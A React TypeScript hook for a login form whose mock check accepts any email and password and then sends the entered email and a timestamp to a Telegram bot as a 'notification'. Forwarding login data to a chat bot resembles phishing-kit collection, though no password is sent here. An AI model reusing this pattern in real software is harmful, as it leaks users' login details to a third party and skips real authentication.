import { useState } from 'react'
import { LoginCredentials, LoginState } from '../../../types/auth'
import { sendTelegramMessage } from '../../../services/telegram'

export function useLogin() {
  const [state, setState] = useState<LoginState>({
    isLoading: false,
    error: null,
    success: false,
  })

  const login = async (credentials: LoginCredentials) => {
    setState({ isLoading: true, error: null, success: false })

    try {
      // Simulate API call
      await new Promise((resolve) => setTimeout(resolve, 1000))

      // Mock validation - replace with real API call
      if (credentials.email && credentials.password) {
        setState({ isLoading: false, error: null, success: true })
        // Send notification to Telegram
        await sendTelegramMessage(`✅ Successful login attempt\nEmail: ${credentials.email}\nTime: ${new Date().toISOString()}`)
      } else {
        setState({ isLoading: false, error: 'Invalid email or password.', success: false })
      }
    } catch {
      setState({
        isLoading: false,
        error: 'An error occurred. Please try again.',
        success: false,
      })
    }
  }

  const reset = () => {
    setState({ isLoading: false, error: null, success: false })
  }

  return { ...state, login, reset }
}